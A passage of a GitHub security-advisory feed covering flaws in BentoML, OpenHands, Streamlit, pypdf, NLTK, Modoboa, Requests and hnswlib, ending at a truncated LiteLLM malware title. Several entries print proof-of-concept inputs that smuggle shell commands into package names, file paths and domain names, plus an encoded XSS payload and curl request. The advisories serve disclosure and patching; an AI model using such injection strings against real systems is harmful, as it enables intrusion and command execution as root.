]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwmf-pq79-vjvx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-17T20:05:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bentoml] BentoML has Dockerfile Command Injection via system_packages in bentofile.yaml]]></title>
        <id>https://github.com/advisories/GHSA-jfjg-vc52-wqvf</id>
        <link href="https://github.com/advisories/GHSA-jfjg-vc52-wqvf"/>
        <updated>2026-03-26T07:32:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>docker.system_packages</code> field in <code>bentofile.yaml</code> accepts arbitrary strings that are interpolated directly into Dockerfile <code>RUN</code> commands without sanitization. Since <code>system_packages</code> is semantically a list of OS package names (data), users do not expect values to be interpreted as shell commands. A malicious <code>bentofile.yaml</code> achieves arbitrary command execution during <code>bentoml containerize</code> / <code>docker build</code>.</p>
<h2 id="affected-component">Affected Component</h2>
<ul>
<li><code>src/_bentoml_sdk/images.py:85-89</code> — <code>.format(packages=" ".join(packages))</code> into shell command</li>
<li><code>src/bentoml/_internal/container/frontend/dockerfile/templates/base_debian.j2:13</code> — <code>{{ __options__system_packages | join(' ') }}</code></li>
<li><code>src/bentoml/_internal/bento/build_config.py:174</code> — No validation on <code>system_packages</code></li>
<li>All distro install commands in <code>src/bentoml/_internal/container/frontend/dockerfile/__init__.py</code></li>
</ul>
<h2 id="affected-versions">Affected Versions</h2>
<p>All versions supporting <code>docker.system_packages</code> in <code>bentofile.yaml</code>, confirmed on 1.4.36.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li>Create a project directory with:</li>
</ol>
<p><strong>service.py:</strong></p>
<pre><code class="language-python">import bentoml

@bentoml.service
class MyService:
    @bentoml.api
    def predict(self) -&gt; str:
        return "hello"
</code></pre>
<p><strong>bentofile.yaml:</strong></p>
<pre><code class="language-yaml">service: "service:MyService"
docker:
  system_packages:
    - "curl &amp;&amp; id &gt; /tmp/bentoml-pwned #"
</code></pre>
<ol start="2">
<li>Run:</li>
</ol>
<pre><code class="language-bash">bentoml build
</code></pre>
<ol start="3">
<li>Examine the generated Dockerfile at <code>~/bentoml/bentos/my_service/&lt;tag&gt;/env/docker/Dockerfile</code>. Line 41 will contain:</li>
</ol>
<pre><code class="language-dockerfile">RUN apt-get install -q -y -o Dpkg::Options::=--force-confdef curl &amp;&amp; id &gt; /tmp/bentoml-pwned #
</code></pre>
<ol start="4">
<li>Running <code>bentoml containerize my_service:&lt;tag&gt;</code> will execute <code>id &gt; /tmp/bentoml-pwned</code> as root during the Docker build.</li>
</ol>
<h2 id="root-cause">Root Cause</h2>
<p>The <code>system_packages</code> field values are treated as package names (data) by the user but are string-formatted directly into shell commands in the Dockerfile:</p>
<pre><code class="language-python"># images.py:85-89
self.commands.append(
    CONTAINER_METADATA[self.distro]["install_command"].format(
        packages=" ".join(packages)  # No escaping
    )
)
</code></pre>
<p>Where <code>install_command</code> is <code>"apt-get install -q -y -o Dpkg::Options::=--force-confdef {packages}"</code>.</p>
<p>A <code>bash_quote</code> filter (wrapping <code>shlex.quote</code>) exists in the codebase and is registered in both Jinja2 environments, but it is only applied to environment variable values, never to <code>system_packages</code>.</p>
<h2 id="impact">Impact</h2>
<ol>
<li><strong>Malicious repositories</strong>: An attacker publishes an ML project with a crafted <code>bentofile.yaml</code>. Anyone who clones and builds it gets arbitrary code execution during <code>docker build</code>.</li>
<li><strong>CI/CD compromise</strong>: Automated pipelines running <code>bentoml containerize</code> on PRs that modify <code>bentofile.yaml</code> are vulnerable.</li>
<li><strong>BentoCloud</strong>: If BentoCloud builds images from user-supplied <code>bentofile.yaml</code>, this could achieve RCE on cloud infrastructure.</li>
<li><strong>Supply chain</strong>: Shared bentos or model repos in the BentoML ecosystem can contain malicious configs.</li>
</ol>
<h2 id="suggested-fix">Suggested Fix</h2>
<h3 id="option-1-input-validation-recommended">Option 1: Input validation (recommended)</h3>
<p>Add a regex validator to <code>system_packages</code> in <code>build_config.py</code>:</p>
<pre><code class="language-python">import re

VALID_PACKAGE_NAME = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9.+\-_:]*$')

def _validate_system_packages(instance, attribute, value):
    if value is None:
        return
    for pkg in value:
        if not VALID_PACKAGE_NAME.match(pkg):
            raise BentoMLException(
                f"Invalid system package name: {pkg!r}. "
                "Package names may only contain alphanumeric characters, "
                "dots, plus signs, hyphens, underscores, and colons."
            )

system_packages: t.Optional[t.List[str]] = attr.field(
    default=None, validator=_validate_system_packages
)
</code></pre>
<h3 id="option-2-output-escaping">Option 2: Output escaping</h3>
<p>Apply <code>shlex.quote()</code> to each package name before interpolation in <code>images.py:system_packages()</code> and apply the <code>bash_quote</code> Jinja2 filter in <code>base_debian.j2</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bentoml/BentoML/security/advisories/GHSA-jfjg-vc52-wqvf">https://github.com/bentoml/BentoML/security/advisories/GHSA-jfjg-vc52-wqvf</a></li>
<li><a href="https://github.com/advisories/GHSA-jfjg-vc52-wqvf">https://github.com/advisories/GHSA-jfjg-vc52-wqvf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jfjg-vc52-wqvf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-26T07:32:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openhands] OpenHands is Vulnerable to Command Injection through its Git Diff Handler]]></title>
        <id>https://github.com/advisories/GHSA-7h8w-hj9j-8rjw</id>
        <link href="https://github.com/advisories/GHSA-7h8w-hj9j-8rjw"/>
        <updated>2026-03-25T21:54:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A Command Injection vulnerability exists in the <code>get_git_diff()</code> method at <code>openhands/runtime/utils/git_handler.py:134</code>. The <code>path</code> parameter from the <code>/api/conversations/{conversation_id}/git/diff</code> API endpoint is passed unsanitized to a shell command, allowing authenticated attackers to execute arbitrary commands in the agent sandbox. The user is already allowed to instruct the agent to execute commands, but this bypasses the normal channels.</p>
<hr>
<h2 id="details">Details</h2>
<h3 id="vulnerable-code-path">Vulnerable Code Path</h3>
<p>The vulnerability flows through these files:</p>
<ol>
<li><strong>API Endpoint</strong> (<code>openhands/server/routes/files.py:267-277</code>)</li>
</ol>
<pre><code class="language-python">@app.get('/git/diff')
async def git_diff(
    path: str,  # &lt;-- User input from HTTP request
    ...
):
    ...
    diff = await call_sync_from_async(runtime.get_git_diff, path, cwd)  # No sanitization
</code></pre>
<ol start="2">
<li><strong>Runtime</strong> (<code>openhands/runtime/base.py:1231-1233</code>)</li>
</ol>
<pre><code class="language-python">def get_git_diff(self, file_path: str, cwd: str) -&gt; dict[str, str]:
    self.git_handler.set_cwd(cwd)
    return self.git_handler.get_git_diff(file_path)  # Passed directly
</code></pre>
<ol start="3">
<li><strong>Vulnerable Method</strong> (<code>openhands/runtime/utils/git_handler.py:10-12, 134</code>)</li>
</ol>
<pre><code class="language-python"># Command template with placeholder
GIT_DIFF_CMD = 'python3 /openhands/code/openhands/runtime/utils/git_diff.py "{file_path}"'

# Line 134 - VULNERABLE: User input directly interpolated
result = self.execute(self.git_diff_cmd.format(file_path=file_path), self.cwd)
</code></pre>
<ol start="4">
<li><strong>Shell Execution</strong> (<code>openhands/runtime/utils/git_diff.py:25-27</code>)</li>
</ol>
<pre><code class="language-python">def run(cmd: str, cwd: str) -&gt; str:
    result = subprocess.run(
        args=cmd,
        shell=True,  # &lt;-- Enables shell metacharacter interpretation
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=cwd
    )
</code></pre>
<h3 id="root-cause">Root Cause</h3>
<p>The <code>file_path</code> parameter is directly interpolated into a shell command string using Python's <code>.format()</code> method without any sanitization. When this command is executed with <code>shell=True</code>, shell metacharacters like <code>"</code>, <code>;</code>, and <code>#</code> are interpreted, allowing command injection.</p>
<p><strong>Example:</strong></p>
<ul>
<li>Input: <code>test"; id #</code></li>
<li>Constructed command: <code>python3 /script.py "test"; id #"</code></li>
<li>Shell interprets as two commands: <code>python3 /script.py "test"</code> AND <code>id</code></li>
</ul>
<hr>
<h2 id="impact">Impact</h2>
<h3 id="who-is-affected">Who is Affected</h3>
<ul>
<li>All OpenHands deployments exposing the <code>/api/conversations/{id}/git/diff</code> endpoint</li>
<li>Any authenticated user can exploit this vulnerability,</li>
</ul>
<h3 id="attack-capabilities">Attack Capabilities</h3>
<p>An attacker can:</p>
<ol>
<li><strong>Execute arbitrary commands</strong> on the runtime container as root</li>
<li><strong>Read sensitive files</strong> including <code>.env</code>, API keys, source code</li>
<li><strong>Write arbitrary files</strong> to inject malicious code</li>
<li><strong>Establish reverse shells</strong> for persistent access</li>
<li><strong>Potentially escape the container</strong> if Docker is misconfigured</li>
</ol>
<h2 id="mitigation">Mitigation</h2>
<p>Users should update to the latest version of OpenHands that includes the changes from PR #13051. The fix replaces direct shell string formatting with proper argument array handling or rigorous path sanitization to prevent command chaining.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenHands/OpenHands/security/advisories/GHSA-7h8w-hj9j-8rjw">https://github.com/OpenHands/OpenHands/security/advisories/GHSA-7h8w-hj9j-8rjw</a></li>
<li><a href="https://github.com/OpenHands/OpenHands/pull/13051">https://github.com/OpenHands/OpenHands/pull/13051</a></li>
<li><a href="https://docs.python.org/3/library/shlex.html#shlex.quote">https://docs.python.org/3/library/shlex.html#shlex.quote</a></li>
<li><a href="https://docs.python.org/3/library/subprocess.html#security-considerations">https://docs.python.org/3/library/subprocess.html#security-considerations</a></li>
<li><a href="https://owasp.org/www-community/attacks/Command_Injection">https://owasp.org/www-community/attacks/Command_Injection</a></li>
<li><a href="https://github.com/advisories/GHSA-7h8w-hj9j-8rjw">https://github.com/advisories/GHSA-7h8w-hj9j-8rjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7h8w-hj9j-8rjw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-25T21:54:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Streamlit] Unauthenticated SSRF Vulnerability in Streamlit on Windows (NTLM Credential Exposure)]]></title>
        <id>https://github.com/advisories/GHSA-7p48-42j8-8846</id>
        <link href="https://github.com/advisories/GHSA-7p48-42j8-8846"/>
        <updated>2026-03-25T21:20:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="streamlit-open-source-security-advisory">Streamlit Open Source Security Advisory</h1>
<h2 id="1-impacted-products">1. Impacted Products</h2>
<p>Streamlit Open Source versions prior to 1.54.0 running on Windows hosts.</p>
<h2 id="2-introduction">2. Introduction</h2>
<p>Snowflake Streamlit Open Source addressed a security vulnerability affecting Windows deployments related to improper handling and validation of filesystem paths within component request handling. The vulnerability was reported through the responsible disclosure program and has been remediated in Streamlit Open Source version 1.54.0. This issue affects only Streamlit deployments running on Windows operating systems.</p>
<h2 id="3-server-side-request-forgery-ssrf-and-ntlm-credential-exposure">3. Server-Side Request Forgery (SSRF) and NTLM Credential Exposure</h2>
<h3 id="31-description">3.1 Description</h3>
<p>Streamlit was informed by a security researcher of an unauthenticated Server-Side Request Forgery (SSRF) vulnerability. The vulnerability arises from improper validation of attacker-supplied filesystem paths. In certain code paths, including within the <code>ComponentRequestHandler</code>, filesystem paths are resolved using <code>os.path.realpath()</code> or <code>Path.resolve()</code> before sufficient validation occurs.</p>
<p>On Windows systems, supplying a malicious UNC path (e.g., <code>\\attacker-controlled-host\share</code>) can cause the Streamlit server to initiate outbound SMB connections over port 445. When Windows attempts to authenticate to the remote SMB server, NTLMv2 challenge-response credentials of the Windows user running the Streamlit process may be transmitted.</p>
<p>This behavior may allow an attacker to:</p>
<ul>
<li>Perform NTLM relay attacks against other internal services</li>
<li>Identify internally reachable SMB hosts via timing analysis</li>
</ul>
<blockquote>
<p><strong>Note:</strong> The issue is unauthenticated and does not require user interaction.</p>
</blockquote>
<p>Captured NTLMv2 challenge-response hashes could be subjected to offline brute-force attacks in an attempt to recover the associated plaintext account password. While NTLMv2 incorporates a server challenge (nonce) that mitigates the use of precomputed rainbow tables, it does not prevent targeted offline password cracking against weak credentials.</p>
<p>Additionally, Microsoft has publicly discouraged the continued use of NTLM in favor of Kerberos and is actively progressing toward disabling NTLM by default in future Windows releases. Organizations that enforce NTLM restrictions, disable outbound NTLM authentication, require SMB signing, or block NTLM authentication to remote servers can reduce or eliminate the risk associated with credential relay or hash exposure scenarios.</p>
<p>As NTLM is considered legacy and increasingly deprecated (though not fully sunset), environments that have already implemented Microsoft-recommended NTLM hardening controls are less likely to be materially impacted. The overall risk therefore depends on the organization's authentication configuration and network security posture.</p>
<h3 id="32-scenarios-and-attack-vectors">3.2 Scenarios and Attack Vectors</h3>
<p>Streamlit applications running on Windows were vulnerable if component endpoints were exposed to untrusted networks. By appending an attacker-controlled SMB hostname to the URI path and issuing a GET request, the Streamlit server could be coerced into initiating an outbound SMB authentication attempt.</p>
<p>This could result in the leakage of NTLMv2 credential hashes for the Windows account running the Streamlit process.</p>
<h3 id="33-resolution">3.3 Resolution</h3>
<ul>
<li>The vulnerability has been fixed in Streamlit Open Source version 1.54.0.</li>
<li>It is recommended that all Streamlit deployments on Windows be upgraded immediately to version 1.54.0 or later.</li>
</ul>
<h2 id="4-contact">4. Contact</h2>
<p>Please contact <a href="mailto:security@snowflake.com">security@snowflake.com</a> for any questions regarding this advisory.</p>
<p>If a security vulnerability is discovered in a Streamlit product or website, it should be reported through the responsible disclosure program. For more information, see the <a href="https://hackerone.com/snowflake">Vulnerability Disclosure Policy</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/streamlit/streamlit/security/advisories/GHSA-7p48-42j8-8846">https://github.com/streamlit/streamlit/security/advisories/GHSA-7p48-42j8-8846</a></li>
<li><a href="https://github.com/streamlit/streamlit/commit/23692ca70b2f2ac720c72d1feb4f190c9d6eed76">https://github.com/streamlit/streamlit/commit/23692ca70b2f2ac720c72d1feb4f190c9d6eed76</a></li>
<li><a href="https://github.com/streamlit/streamlit/releases/tag/1.54.0">https://github.com/streamlit/streamlit/releases/tag/1.54.0</a></li>
<li><a href="https://github.com/advisories/GHSA-7p48-42j8-8846">https://github.com/advisories/GHSA-7p48-42j8-8846</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7p48-42j8-8846</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-25T21:20:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypdf] pypdf: Possible infinite loop during recovery attempts in DictionaryObject.read_from_stream]]></title>
        <id>https://github.com/advisories/GHSA-87mj-5ggw-8qc3</id>
        <link href="https://github.com/advisories/GHSA-87mj-5ggw-8qc3"/>
        <updated>2026-03-25T20:05:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires reading a file in non-strict mode.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in <a href="https://github.com/py-pdf/pypdf/releases/tag/6.9.2">pypdf==6.9.2</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If users cannot upgrade yet, consider applying the changes from PR <a href="https://github.com/py-pdf/pypdf/pull/3693">#3693</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-87mj-5ggw-8qc3">https://github.com/py-pdf/pypdf/security/advisories/GHSA-87mj-5ggw-8qc3</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/3693">https://github.com/py-pdf/pypdf/pull/3693</a></li>
<li><a href="https://github.com/py-pdf/pypdf/releases/tag/6.9.2">https://github.com/py-pdf/pypdf/releases/tag/6.9.2</a></li>
<li><a href="https://github.com/advisories/GHSA-87mj-5ggw-8qc3">https://github.com/advisories/GHSA-87mj-5ggw-8qc3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87mj-5ggw-8qc3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-25T20:05:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in nltk]]></title>
        <id>https://github.com/advisories/GHSA-gfwx-w7gr-fvh7</id>
        <link href="https://github.com/advisories/GHSA-gfwx-w7gr-fvh7"/>
        <updated>2026-03-25T18:21:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>nltk.app.wordnet_app</code> contains a reflected cross-site scripting issue in the <code>lookup_...</code> route. A crafted <code>lookup_&lt;payload&gt;</code> URL can inject arbitrary HTML/JavaScript into the response page because attacker-controlled <code>word</code> data is reflected into HTML without escaping. This impacts users running the local WordNet Browser server and can lead to script execution in the browser origin of that application.</p>
<h3 id="details">Details</h3>
<p>The vulnerable flow is in <code>nltk/app/wordnet_app.py</code>:</p>
<ul>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L144"><code>nltk/app/wordnet_app.py:144</code></a></p>
<ul>
<li>Requests starting with <code>lookup_</code> are handled as HTML responses:</li>
<li><code>page, word = page_from_href(sp)</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L755"><code>nltk/app/wordnet_app.py:755</code></a></p>
<ul>
<li><code>page_from_href()</code> calls <code>page_from_reference(Reference.decode(href))</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L769"><code>nltk/app/wordnet_app.py:769</code></a></p>
<ul>
<li><code>word = href.word</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L796"><code>nltk/app/wordnet_app.py:796</code></a></p>
<ul>
<li>If no results are found, <code>word</code> is inserted directly into the HTML body:</li>
<li><code>body = "The word or words '%s' were not found in the dictionary." % word</code></li>
</ul>
</li>
</ul>
<p>This is inconsistent with the <code>search</code> route, which does escape user input:</p>
<ul>
<li><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L136"><code>nltk/app/wordnet_app.py:136</code></a><ul>
<li><code>word = html.escape(...)</code></li>
</ul>
</li>
</ul>
<p>As a result, a malicious <code>lookup_...</code> payload can inject script into the response page.</p>
<p>The issue is exploitable because:</p>
<ul>
<li><code>Reference.decode()</code> accepts attacker-controlled base64-encoded pickle data for the URL state.</li>
<li>The decoded <code>word</code> is reflected into HTML without <code>html.escape()</code>.</li>
<li>The server is started with <code>HTTPServer(("", port), MyServerHandler)</code>, so it listens on all interfaces by default, not just <code>localhost</code>.</li>
</ul>
<h3 id="poc">PoC</h3>
<ol>
<li>Start the WordNet Browser in an isolated Docker environment:</li>
</ol>
<pre><code class="language-bash">docker run -d --name nltk-wordnet-web -p 8002:8002 \
  nltk-sandbox \
  python -c "import nltk; nltk.download('wordnet', quiet=True); from nltk.app.wordnet_app import wnb; wnb(8002, False)"
</code></pre>
<ol start="2">
<li>Use the following crafted payload, which decodes to:</li>
</ol>
<pre><code class="language-python">("&lt;script&gt;alert(1)&lt;/script&gt;", {})
</code></pre>
<p>Encoded payload:</p>
<pre><code class="language-text">gAWVIQAAAAAAAACMGTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD6UfZSGlC4=
</code></pre>
<ol start="3">
<li>Request the vulnerable route:</li>
</ol>
<pre><code class="language-bash">curl -s "http://127.0.0.1:8002/lookup_gAWVIQAAAAAAAACMGTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD6UfZSGlC4="
</code></pre>
<ol start="4">
<li>Observed result:</li>
</ol>
<pre><code class="language-text">The word or words '&lt;script&gt;alert(1)&lt;/script&gt;' were not found in the dictionary.
</code></pre>
<img width="867" height="208" alt="127" src="https://github.com/user-attachments/assets/ec09da08-09bc-4fc4-bfc1-c4489e9adaf6">


<p>I also validated the issue directly at function level in Docker:</p>
<pre><code class="language-python">import base64
import pickle

from nltk.app.wordnet_app import page_from_href

payload = base64.urlsafe_b64encode(
    pickle.dumps(("&lt;script&gt;alert(1)&lt;/script&gt;", {}), -1)
).decode()

page, word = page_from_href(payload)
print(word)
print("&lt;script&gt;alert(1)&lt;/script&gt;" in page)
</code></pre>
<p>Observed output:</p>
<pre><code class="language-text">WORD= &lt;script&gt;alert(1)&lt;/script&gt;
HAS_SCRIPT= True
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a reflected XSS issue in the NLTK WordNet Browser web UI.</p>
<p>An attacker who can convince a user to open a crafted <code>lookup_...</code> URL can execute arbitrary JavaScript in the origin of the local WordNet Browser application. This can be used to:</p>
<ul>
<li>run arbitrary script in the browser tab</li>
<li>manipulate the page content shown to the user</li>
<li>issue same-origin requests to other WordNet Browser routes</li>
<li>potentially trigger available UI actions in that local app context</li>
</ul>
<p>This primarily impacts users who run <code>nltk.app.wordnet_app</code> as a local or self-hosted HTTP service and open attacker-controlled links.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-gfwx-w7gr-fvh7">https://github.com/nltk/nltk/security/advisories/GHSA-gfwx-w7gr-fvh7</a></li>
<li><a href="https://github.com/nltk/nltk/commit/1c3f799607eeb088cab2491dcf806ae83c29ad8f">https://github.com/nltk/nltk/commit/1c3f799607eeb088cab2491dcf806ae83c29ad8f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33230">https://nvd.nist.gov/vuln/detail/CVE-2026-33230</a></li>
<li><a href="https://github.com/nltk/nltk/commit/40d0bc1d484a3458d6a63ecb5ba4957ab16ba14e">https://github.com/nltk/nltk/commit/40d0bc1d484a3458d6a63ecb5ba4957ab16ba14e</a></li>
<li><a href="https://github.com/advisories/GHSA-gfwx-w7gr-fvh7">https://github.com/advisories/GHSA-gfwx-w7gr-fvh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gfwx-w7gr-fvh7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-18T20:23:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[modoboa] Modoboa has OS Command Injection]]></title>
        <id>https://github.com/advisories/GHSA-wwv8-cqpr-vx3m</id>
        <link href="https://github.com/advisories/GHSA-wwv8-cqpr-vx3m"/>
        <updated>2026-03-25T17:03:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>exec_cmd()</code> in <code>modoboa/lib/sysutils.py</code> always runs subprocess calls with <code>shell=True</code>. Since domain names flow directly into shell command strings without any sanitization, a Reseller or SuperAdmin can include shell metacharacters in a domain name to run arbitrary OS commands on the server.</p>
<h3 id="details">Details</h3>
<p>The root cause is in <code>modoboa/lib/sysutils.py:31</code>:</p>
<pre><code class="language-python">kwargs["shell"] = True
process = subprocess.Popen(cmd, **kwargs)
</code></pre>
<p>When a create a domain is created with DKIM enabled, the domain name gets embedded into a shell command like this:</p>
<pre><code class="language-python">exec_cmd(f"openssl genrsa -out {dkim_storage_dir}/{domain.name}.pem {key_size}")
</code></pre>
<p>If the domain name contains something like <code>$(id&gt;/tmp/proof).example.com</code>, the shell executes the injected command before running openssl.</p>
<p>The same pattern appears in several other places:</p>
<ul>
<li><code>modoboa/admin/jobs.py:38</code> — mailbox rename via <code>mv</code> using <code>full_address</code></li>
<li><code>modoboa/amavis/lib.py:202</code> — <code>sa-learn</code> using <code>domain.name</code></li>
<li><code>modoboa/admin/models/mailbox.py:150</code> — <code>doveadm user</code> using <code>full_address</code></li>
<li><code>modoboa/maillog/graphics.py:105–107</code> — <code>rrdtool</code> using <code>domain.name</code></li>
<li><code>modoboa/webmail/models.py:54–57</code> — <code>doveadm move/delete</code> using <code>account.email</code></li>
</ul>
<h3 id="poc">PoC</h3>
<ol>
<li>Deploy modoboa &lt;= 2.7.0</li>
<li>Log in as a Reseller or SuperAdmin</li>
<li>Create a new domain named <code>$(id&gt;/tmp/proof).example.com</code> with DKIM enabled</li>
<li>SSH into the server and read <code>/tmp/proof</code></li>
</ol>
<p>Something like this will be displayed:</p>
<pre><code>uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>Confirmed on commit b521bcb4f (latest main at time of discovery).</p>
<h3 id="impact">Impact</h3>
<p>An attacker with Reseller-level access (or higher) can execute arbitrary OS commands on the mail server — in a typical Modoboa deployment this means running as root. All six identified sinks are reachable through normal application workflows.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/modoboa/modoboa/security/advisories/GHSA-wwv8-cqpr-vx3m">https://github.com/modoboa/modoboa/security/advisories/GHSA-wwv8-cqpr-vx3m</a></li>
<li><a href="https://github.com/modoboa/modoboa/commit/27a7aa133d3608fe8c25ae39125d1012c333cbfa">https://github.com/modoboa/modoboa/commit/27a7aa133d3608fe8c25ae39125d1012c333cbfa</a></li>
<li><a href="https://github.com/modoboa/modoboa/releases/tag/2.7.1">https://github.com/modoboa/modoboa/releases/tag/2.7.1</a></li>
<li><a href="https://github.com/advisories/GHSA-wwv8-cqpr-vx3m">https://github.com/advisories/GHSA-wwv8-cqpr-vx3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wwv8-cqpr-vx3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-25T17:03:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[requests] Requests has Insecure Temp File Reuse in its extract_zipped_paths() utility function]]></title>
        <id>https://github.com/advisories/GHSA-gc5v-m9x4-r6x2</id>
        <link href="https://github.com/advisories/GHSA-gc5v-m9x4-r6x2"/>
        <updated>2026-03-25T16:56:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>requests.utils.extract_zipped_paths()</code> utility function uses a predictable filename when extracting files from zip archives into the system temporary directory. If the target file already exists, it is reused without validation. A local attacker with write access to the temp directory could pre-create a malicious file that would be loaded in place of the legitimate one.</p>
<h3 id="affected-usages">Affected usages</h3>
<p><strong>Standard usage of the Requests library is not affected by this vulnerability.</strong> Only applications that call <code>extract_zipped_paths()</code> directly are impacted.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to at least Requests 2.33.0, where the library now extracts files to a non-deterministic location.</p>
<p>If developers are unable to upgrade, they can set <code>TMPDIR</code> in their environment to a directory with restricted write access.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/psf/requests/security/advisories/GHSA-gc5v-m9x4-r6x2">https://github.com/psf/requests/security/advisories/GHSA-gc5v-m9x4-r6x2</a></li>
<li><a href="https://github.com/psf/requests/commit/66d21cb07bd6255b1280291c4fafb71803cdb3b7">https://github.com/psf/requests/commit/66d21cb07bd6255b1280291c4fafb71803cdb3b7</a></li>
<li><a href="https://github.com/psf/requests/releases/tag/v2.33.0">https://github.com/psf/requests/releases/tag/v2.33.0</a></li>
<li><a href="https://github.com/advisories/GHSA-gc5v-m9x4-r6x2">https://github.com/advisories/GHSA-gc5v-m9x4-r6x2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gc5v-m9x4-r6x2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-25T16:56:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hnswlib] hnswlib Double Free vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-xwc8-rf6m-xr86</id>
        <link href="https://github.com/advisories/GHSA-xwc8-rf6m-xr86"/>
        <updated>2026-03-25T15:04:47.000Z</updated>
        <content type="html"><![CDATA[<p>Hnswlib 0.7.0 has a double free in <code>init_index</code> when the M argument is a large integer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37365">https://nvd.nist.gov/vuln/detail/CVE-2023-37365</a></li>
<li><a href="https://github.com/nmslib/hnswlib/issues/467">https://github.com/nmslib/hnswlib/issues/467</a></li>
<li><a href="https://github.com/nmslib/hnswlib/pull/484">https://github.com/nmslib/hnswlib/pull/484</a></li>
<li><a href="https://github.com/nmslib/hnswlib/commit/f6d170ce0b41f9e75ace473b09df6e7872590757">https://github.com/nmslib/hnswlib/commit/f6d170ce0b41f9e75ace473b09df6e7872590757</a></li>
<li><a href="https://github.com/advisories/GHSA-xwc8-rf6m-xr86">https://github.com/advisories/GHSA-xwc8-rf6m-xr86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xwc8-rf6m-xr86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-30T21:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] Two LiteLLM versions published containing credential harvesting malware]]></title>
        <id>https://github.com/advisories/GHSA-5mg7-485q-xm76</id>
        <link href="https://github.com/advisories/GHSA-5mg7-485q-xm76"/>
        <updated>2026-03-27T00:32:12.000Z</updated>
